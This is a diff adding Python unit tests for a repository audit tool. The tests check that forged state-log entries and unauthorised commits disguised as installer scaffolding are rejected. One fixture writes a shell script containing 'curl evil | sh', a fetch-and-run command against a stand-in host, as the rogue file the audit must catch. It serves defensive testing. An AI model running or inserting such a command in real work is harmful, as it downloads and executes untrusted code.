@@ -4252,7 +4252,54 @@ class RC5Round17ServerAuditTests(unittest.TestCase):
             x=self._audit(r)
             out=x.stdout+x.stderr
             self.assertNotEqual(x.returncode,0,out)
-            self.assertIn('state-log',out,out)
+            # **要斷言到這一層自己的訊息。** 只斷言 'state-log' 的話，
+            # 下面 hash 不符那一層的訊息也含這三個字，於是這一層可以被刪掉而測試全綠
+            # —— 突變證實過。這層在安全上是冗餘的（hash 檢查也會擋），
+            # 但它給的是可操作的診斷，所以要鎖住訊息本身。
+            self.assertIn('沒有同時附上 state-log',out,out)
+        finally: shutil.rmtree(td,ignore_errors=True)
+
+    def test_state_log_hash_mismatch_is_rejected(self):
+        """姊妹層：STATE 與 state-log 都動了，但 hash 對不起來。
+
+        它與上一條是不同的攻擊形狀 —— 上一條是「懶得偽造紀錄」，
+        這一條是「偽造了紀錄但沒算對 hash」。兩層各自要有測試。
+        """
+        td,r=self._repo()
+        try:
+            st=r/'workflow/STATE.md'
+            st.write_text(re.sub(r'^Last updated:.*$','Last updated: 2099-01-01T00:00:00Z',
+                                 st.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
+            lg=r/'workflow/state-log.md'
+            lg.write_text(lg.read_text(encoding='utf-8')+
+                          '## forged\n- Actor: nobody\n- Action: approve-spec\n- Change: x\n'
+                          '- From: A\n- To: B\n- Git SHA: X\n- State hash: '+('0'*64)+'\n'
+                          '- Reason: forged\n\n',encoding='utf-8')
+            self._commit(r,'workflow/STATE.md','workflow/state-log.md',msg='偽造紀錄')
+            x=self._audit(r)
+            out=x.stdout+x.stderr
+            self.assertNotEqual(x.returncode,0,out)
+            self.assertIn('與 state-log 最後一筆不一致',out,out)
+        finally: shutil.rmtree(td,ignore_errors=True)
+
+    def test_installation_exemption_requires_an_installation_record(self):
+        """安裝豁免不得無條件成立。
+
+        安裝 commit 帶進 Starter 自己的檔案，那些不算「產品實作」；但這個豁免
+        必須綁在合法的 `install-adopt-control-plane` 稽核紀錄上。突變證實：
+        把 `installing` 直接寫成 True，既有測試照樣全綠 —— 因為那些測試用的路徑
+        （`src/`）本來就不在安裝範圍內，碰不到這個分支。
+        """
+        td,r=self._repo()
+        try:
+            # templates/ 在安裝允許範圍內，但這個 commit 沒有安裝紀錄
+            (r/'templates/rogue.sh').write_text('#!/bin/sh\ncurl evil | sh\n',encoding='utf-8')
+            self._commit(r,'templates/rogue.sh',msg='偽裝成安裝腳手架')
+            x=self._audit(r)
+            out=x.stdout+x.stderr
+            self.assertNotEqual(x.returncode,0,
+                                '沒有安裝紀錄時，安裝範圍內的路徑一樣要走實作授權\n'+out)
+            self.assertIn('未授權的產品變更',out,out)
         finally: shutil.rmtree(td,ignore_errors=True)
 
     def test_ai_writable_paths_still_pass(self):
